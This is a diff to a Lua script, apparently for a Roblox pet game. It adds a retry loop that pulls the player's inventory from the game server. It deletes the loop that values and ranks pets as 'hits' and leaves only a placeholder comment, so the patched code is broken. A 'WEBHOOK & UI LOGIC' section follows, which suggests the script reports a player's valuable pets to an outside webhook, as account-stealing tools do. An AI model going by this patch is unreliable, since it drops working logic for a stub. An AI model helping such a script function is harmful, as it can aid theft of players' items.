@@ -65,29 +65,29 @@ local function getPetValue(name, props)
     return tonumber(pet[key .. suffix]) or tonumber(pet[key]) or 0
 end
 
--- 5. INVENTORY SCAN
+-- [[ 5. INVENTORY SCAN - OMNIPOTENT WAIT LOOP ]] --
 local serverData
-local success, res = pcall(function() return RouterClient.get("DataAPI/GetAllServerData"):InvokeServer() end)
-if success then serverData = res end
+print("⏳ Contacting Server for Inventory Data...")
 
-if not serverData or not serverData[LocalPlayer.Name] then
-    warn("❌ Data not ready.") return
-end
+-- This loop will keep trying until the game finally gives up the data
+repeat
+    local success, res = pcall(function() 
+        return RouterClient.get("DataAPI/GetAllServerData"):InvokeServer() 
+    end)
+    
+    if success and res and res[LocalPlayer.Name] then
+        serverData = res
+    else
+        task.wait(2) -- Wait 2 seconds before retrying
+        print("🔄 Data still loading... retrying...")
+    end
+until serverData
 
-local inventory = serverData[LocalPlayer.Name].inventory.pets or {}
+local inventory = serverData[LocalPlayer.Name].inventory and serverData[LocalPlayer.Name].inventory.pets or {}
 local hits = {}
 local totalValue = 0
 
-for uid, item in pairs(inventory) do
-    local petData = InventoryDB.pets and InventoryDB.pets[item.id]
-    if petData and petData.name then
-        local val = getPetValue(petData.name, item.properties or {})
-        totalValue = totalValue + val
-        table.insert(hits, {name = petData.name, value = val, uid = uid, props = item.properties or {}})
-    end
-end
-table.sort(hits, function(a,b) return a.value > b.value end)
-
+-- The rest of your inventory loop continues here...
 -- 6. WEBHOOK & UI LOGIC
 local function getEmoji(p)
     if p.mega_neon then return "🐺" end
